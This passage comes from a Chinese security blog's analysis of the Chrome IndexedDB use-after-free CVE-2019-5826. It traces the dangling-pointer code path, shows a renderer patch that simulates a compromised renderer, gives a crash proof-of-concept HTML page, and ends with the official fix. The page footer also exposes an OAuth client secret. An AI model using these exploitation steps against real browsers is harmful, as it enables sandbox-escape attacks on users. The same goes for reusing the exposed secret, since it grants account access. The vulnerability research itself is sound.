<p>预期情况是，当最后一个连接被erase后，一定进入下面的if语句以执行<code>factory_-&gt;ReleaseDatabase</code>，但在这里显然是一个非预期情况。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::Close</span><span class="params">(IndexedDBConnection* connection, <span class="keyword">bool</span> forced)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (active_request_)</span><br><span class="line">    active_request_-&gt;OnConnectionClosed(connection);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针</span></span><br><span class="line">  <span class="keyword">if</span> (connections_.empty() &amp;&amp; !active_request_ &amp;&amp; pending_requests_.empty()) &#123;</span><br><span class="line">    backing_store_ = <span class="literal">nullptr</span>;</span><br><span class="line">    factory_-&gt;ReleaseDatabase(identifier_, forced);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>factory_-&gt;ReleaseDatabase</code>函数会将<strong>指向当前数据库的原始指针</strong>从<code>database_map_</code>中删除，也就是说，若<code>IndexedDBFactoryImpl::ReleaseDatabase</code>不被执行，则<strong>该原始指针就一直保存在<code>database_map_</code>中</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBFactoryImpl::ReleaseDatabase</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> IndexedDBDatabase::Identifier&amp; identifier,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">bool</span> forced_close)</span> </span>&#123;</span><br><span class="line">  DCHECK(!database_map_.find(identifier)-&gt;second-&gt;backing_store());</span><br><span class="line">  <span class="comment">// 将当前IndexedDatabase原始指针从database_map中删除</span></span><br><span class="line">  RemoveDatabaseFromMaps(identifier);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// No grace period on a forced-close, as the initiator is</span></span><br><span class="line">  <span class="comment">// assuming the backing store will be released once all</span></span><br><span class="line">  <span class="comment">// connections are closed.</span></span><br><span class="line">  ReleaseBackingStore(identifier.first, forced_close);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终，<code>database_map_</code>中保留的<strong>原始指针并没有被删除</strong>。</p>
</li>
<li>
<p>同时，当控制流返回<code>IndexedDBDatabase::ForceClose</code>函数时，由于<code>connections_</code>集合既执行了<code>erase</code>函数，又执行了<code>insert</code>函数，因此在下一次判断循环条件<code>it != connections_.end()</code>时，<code>connection_</code>集合中仍然存在connection（尽管此时的连接非彼时的连接），<strong>connection_集合的元素个数将保持不变</strong>。</p>
<p>而<code>end</code>函数返回的是<code>list</code>的迭代器，<strong>所以返回的<code>end</code>迭代器将保证不变</strong>，而<code>it++</code>，因此将跳出该循环，结束<strong>连接的终止操作</strong>。</p>
<p>但最重要的是，<code>IndexedDBFactoryImpl::database_map</code>中<strong>仍然保留指向当前数据库的原始指针</strong>。该指针本应该在当前循环执行结束时被移除，但这里却没有被移除。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBDatabase::ForceClose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">auto</span> it = connections_.begin();</span><br><span class="line">  <span class="keyword">while</span> (it != connections_.end()) &#123;</span><br><span class="line">    IndexedDBConnection* connection = *it++;</span><br><span class="line">    <span class="comment">// 注意这一步，执行`connection-&gt;ForceClose()`时，程序会关闭当前连接。</span></span><br><span class="line">    <span class="comment">// 但倘若当前遍历的连接是connection_中的最后一条连接，则会执行函数StartUpgrade以建立新连接</span></span><br><span class="line">    connection-&gt;ForceClose();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>现在，我们可以成功将指向当前<code>IndexedDatabase</code>的一个原始指针保存至<strong>本不该保存的地方</strong>(指<code>database_map</code>)。而我们下一步要做的就是尝试将当前<code>IndexedDatabase</code>所使用的内存释放。</p>
</li>
</ul>
<h4 id="b-释放IndexedDB内存">b. 释放IndexedDB内存</h4>
<ul>
<li>
<p>IndexedDBDatabase对象是一种<strong>引用计数（Reference counted）的对象</strong>。 针对该对象的计数引用被保存在IndexedDBConnection对象、IndexedDBTransaction对象或其他正在进行或待处理的请求对象中。 一旦引用计数降至0，会立即释放对象。（以免忘记，这段又重复了一遍）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBConnection</span> &#123;</span></span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// NULL in some unit tests, and after the connection is closed.</span></span><br><span class="line">  scoped_refptr&lt;IndexedDBDatabase&gt; database_;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CONTENT_EXPORT</span> <span class="title">IndexedDBTransaction</span> &#123;</span></span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">  scoped_refptr&lt;IndexedDBDatabase&gt; database_;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>也就是说，一旦我们将所有与当前IndexedDBDatabase对象相关的Connection和Transaction对象全部释放，那么当前IndexedDBDatabase就会因为引用计数为0而自动释放。</p>
</li>
<li>
<p>Issue941746给出了一种方法 —— 通过调用<code>IndexedDBFactoryImpl::AbortTransactionsForDatabase</code>来释放IndexedDBDatabase对象。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用call</span></span><br><span class="line">content::IndexedDBFactoryImpl::AbortTransactionsForDatabase</span><br><span class="line">  content::IndexedDBFactoryImpl::AbortTransactions                 <span class="comment">// 循环对所有IndexedDatabase执行AbortAllTransactionsForConnections</span></span><br><span class="line">    content::IndexedDBDatabase::AbortAllTransactionsForConnections <span class="comment">// 循环对所有Connection执行FinishAllTransactions</span></span><br><span class="line">      content::IndexedDBConnection::FinishAllTransactions          <span class="comment">// 循环对所有Transactions执行Abort</span></span><br><span class="line">        content::IndexedDBTransaction::Abort</span><br><span class="line">          content::IndexedDBConnection::RemoveTransaction          <span class="comment">// 释放Transaction</span></span><br><span class="line">          content::IndexedDBDatabase::TransactionFinished          <span class="comment">// 释放Connection</span></span><br></pre></td></tr></table></figure>
<p>执行<code>AbortTransactionsForDatabase</code>函数将会释放所有的<code>IndexedDBConnection</code>以及<code>IndexedDBTransaction</code>，进而释放<code>IndexedDatabase</code>对象，如此就能达到我们想要释放某个IndexedDatabase对象的目的。</p>
<blockquote>
<p>这里贴出IndexedDBTransaction::Abort函数的关键代码。<strong>请注意函数内部的注释</strong>。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IndexedDBTransaction::Abort</span><span class="params">(<span class="keyword">const</span> IndexedDBDatabaseError&amp; error)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  database_-&gt;TransactionFinished(<span class="keyword">this</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// RemoveTransaction will delete |this|.</span></span><br><span class="line">  <span class="comment">// Note: During force-close situations, the connection can be destroyed during</span></span><br><span class="line">  <span class="comment">// the |IndexedDBDatabase::TransactionFinished| call</span></span><br><span class="line">  <span class="comment">// 上面这段注释表示，在`force_close = true`的前提下，执行该函数将会释放connection以及trasaction</span></span><br><span class="line">  <span class="keyword">if</span> (connection_)</span><br><span class="line">    connection_-&gt;RemoveTransaction(id_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="c-如何触发UAF">c. 如何触发UAF</h4>
<ul>
<li>
<p>根据上面的分析，我们可以得出，当顺序调用这三个函数时，我们便可以成功使<code>database_map</code>中保存一个指向已被释放内存的悬垂指针。</p>
<ul>
<li><code>Open(db1)</code></li>
<li><code>DeleteDatabase(db1, force_close=True)</code></li>
<li><code>AbortTransactionsForDatabase</code></li>
</ul>
</li>
<li>
<p>之后，我们只需通过Heap Spray将这块被释放的内存重新分配回来即可利用。</p>
</li>
<li>
<p>但这里有个问题，如何在render进程中通过IndexedDBFactory来调用这三个函数呢？实际上，render的JS接口可以调用IndexedDB的<code>open</code>和<code>deleteDatabase</code>，但无法调用<code>AbortTransactionsForDatabase</code>接口。同时，这里存在一个问题，<strong>我们无法保证browser进程中的函数执行顺序如我们所期待的那样</strong>，因为Js中IndexedDB接口大多都是<strong>异步</strong>的，因此browser中的这三个函数可能无法依次、完全的完成执行。</p>
</li>
<li>
<p>但我们又必须在render进程中依次同步执行这三个函数，而这就是为什么<strong>该漏洞只能在<code>render RCE</code>的基础上利用</strong>的原因了。</p>
<p>由于 <strong><code>render RCE</code>可以给render进程自己打上patch</strong>，所以就可以在render进程中打patch<strong>以保证这三个函数可以被同步调用</strong>（即依次执行）。</p>
<blockquote>
<p>这也是为什么在<strong>环境搭建</strong>时要在chrome源码中打上patch的原因，因为手动打上patch可以模拟render RCE 打patch的结果。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// third_party/blink/renderer/modules/indexeddb/web_idb_factory_impl.cc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WebIDBFactoryImpl::Open</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">       <span class="built_in">std</span>::make_unique&lt;IndexedDBDatabaseCallbacksImpl&gt;(</span></span></span><br><span class="line"><span class="function"><span class="params">           base::WrapUnique(database_callbacks));</span></span></span><br><span class="line"><span class="function"><span class="params">   DCHECK(!name.IsNull());</span></span></span><br><span class="line"><span class="function"><span class="params">   factory_-&gt;Open(GetCallbacksProxy(<span class="built_in">std</span>::move(callbacks_impl)),</span></span></span><br><span class="line"><span class="function"><span class="params">                  GetDatabaseCallbacksProxy(<span class="built_in">std</span>::move(database_callbacks_impl)),</span></span></span><br><span class="line"><span class="function"><span class="params">                  name, version, transaction_id);</span></span></span><br><span class="line"><span class="function"><span class="params">+  <span class="keyword">if</span> (version == <span class="number">3</span>) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info;</span></span></span><br><span class="line"><span class="function"><span class="params">+    <span class="keyword">auto</span> request = mojo::MakeRequest(&amp;ptr_info);</span></span></span><br><span class="line"><span class="function"><span class="params">+    factory_-&gt;DeleteDatabase(<span class="built_in">std</span>::move(ptr_info), origin, name, <span class="literal">true</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+    factory_-&gt;AbortTransactionsForDatabase(origin, base::OnceCallback&lt;<span class="keyword">void</span>(blink::mojom::IDBStatus)&gt;());</span></span></span><br><span class="line"><span class="function"><span class="params">+  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params"> &#125;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="d-POC">d. POC</h4>
<p>笔者在<code>issue 941746</code>提供的poc上做了一点修改，新构造的POC删除了无用的语句，并使Chrome触发Crash</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            /*</span><br><span class="line">                在chrome进程中依次同步执行open、deleteDatabase以及AbortTransactionsForDatabase函数</span><br><span class="line">                执行完成后将会产生一个悬垂指针</span><br><span class="line">            */</span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="built_in">window</span>.indexedDB.open(<span class="string">"db1"</span>, <span class="number">3</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 尝试使用这个悬垂指针，应该会造成crash</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.indexedDB.deleteDatabase(<span class="string">"db1"</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"poc()"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Chrome成功crash</p>
<p><img src="/2020/10/CVE-2019-5826/crash.png" alt="img"></p>
<blockquote>
<p>图中多输出的<code>nice</code>，为chrome打patch时多添加的一条printf语句</p>
<p>该语句的输出表示patch部分代码被执行。</p>
</blockquote>
<h3 id="4-后记">4. 后记</h3>
<p>以下是chrome团队修复后的代码。该<a href="https://chromium.googlesource.com/chromium/src.git/+/eaf2e8bce3855d362e53034bd83f0e3aff8714e4%5E%21/" target="_blank" rel="noopener">patch</a>彻彻底底将<code>connections_</code>集合中的所有连接全部关闭。patch前的代码依赖<strong>迭代器</strong>来判断是否全部关闭所有连接，而patch后的代码使用集合元素个数来进行判断，某种程度上使得代码更加安全。</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -1949,10 +1949,10 @@</span></span><br><span class="line">     request-&gt;AbortForForceClose();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-  auto it = connections_.begin();</span></span><br><span class="line"><span class="deletion">-  while (it != connections_.end()) &#123;</span></span><br><span class="line"><span class="deletion">-    IndexedDBConnection* connection = *it++;</span></span><br><span class="line"><span class="addition">+  while (!connections_.empty()) &#123;</span></span><br><span class="line"><span class="addition">+    IndexedDBConnection* connection = *connections_.begin();</span></span><br><span class="line">     connection-&gt;ForceClose();</span><br><span class="line"><span class="addition">+    connections_.erase(connection);</span></span><br><span class="line">   &#125;</span><br><span class="line">   DCHECK(connections_.empty());</span><br><span class="line">   DCHECK(!active_request_);</span><br></pre></td></tr></table></figure>
<h2 id="四、参考">四、参考</h2>
<ul>
<li>
<p><a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#the-most-secure-browser-pwning-chrome-from--to--16274" target="_blank" rel="noopener">The Most Secure Browser? Pwning Chrome from 2016 to 2019</a></p>
<ul>
<li><a href="http://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019.pdf" target="_blank" rel="noopener">Presentation Slides</a></li>
<li><a href="http://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019-wp.pdf" target="_blank" rel="noopener">White Paper</a>（<strong>相当有用</strong>）</li>
</ul>
</li>
<li>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5826" target="_blank" rel="noopener">NVD - CVE-2019-5826 Dtail</a></p>
</li>
<li>
<p><a href="https://crbug.com/941746" target="_blank" rel="noopener">Chrome Issue 941746: Security: UAF in content::IndexedDBDatabase</a></p>
</li>
<li>
<p><a href="https://www.anquanke.com/post/id/183809#h3-3" target="_blank" rel="noopener">通过IndexedDB条件竞争实现Chrome沙箱逃逸（上）</a></p>
<blockquote>
<p>该文章<strong>并没有涉及</strong>我们当前所研究的UAF漏洞，但即便如此，它仍然提供了一些关于<code>IndexedDB</code>相关的说明。</p>
</blockquote>
</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/10/CVE-2019-5826/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome/" rel="tag">chrome</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2020/10/CVE-2020-6549/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            CVE-2020-6549分析
          
        </div>
      </a>
    
    
      <a href="/2020/10/mojo/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">Plaid CTF 2020 mojo Writeup</div>
      </a>
    
  </nav>

   
 
   
<div class="gitalk" id="gitalk-container"></div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">


<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>


<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>

<script type="text/javascript">
  var gitalk = new Gitalk({
    clientID: '5f6c407f4cb8963d03ac',
    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
    repo: 'kiprey.github.io',
    owner: 'kiprey',
    admin: ['kiprey'],
    // id: location.pathname,      // Ensure uniqueness and length less than 50
    id: md5(location.pathname),
    distractionFreeMode: false,  // Facebook-like distraction free mode
    pagerDirection: 'last'
  })

  gitalk.render('gitalk-container')
</script>
     
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2020-2025
        <i class="ri-heart-fill heart_icon"></i> Kiprey
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                var int1 = setInterval(fixCount1, 100);
                var int2 = setInterval(fixCount2, 100);

                var busuanziValueSiteOffset = 100000000000;
                var busuanziValuePageOffset = 200000000000;
                function fixCount1() {
                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
                        clearInterval(int1);
                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
                    }
                }
                function fixCount2() {
                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
                        clearInterval(int2);
                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
                    }
                }
            });
        </script> -->
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
      </li>
    </ul>
  </div>
</footer>
      <div class="float_btns">
        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

      </div>
    </main>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <script>
      if (window.matchMedia("(max-width: 768px)").matches) {
        document.querySelector('.content').classList.remove('on');
        document.querySelector('.sidebar').classList.remove('on');
      }
    </script>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
  </div>
</div>
    
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->


<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: '.tocbot',
    contentSelector: '.article-entry',
    headingSelector: 'h1, h2, h3, h4, h5, h6',
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: 'main',
    positionFixedSelector: '.tocbot',
    positionFixedClass: 'is-position-fixed',
    fixedSidebarOffset: 'auto'
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>

<!-- MathJax -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

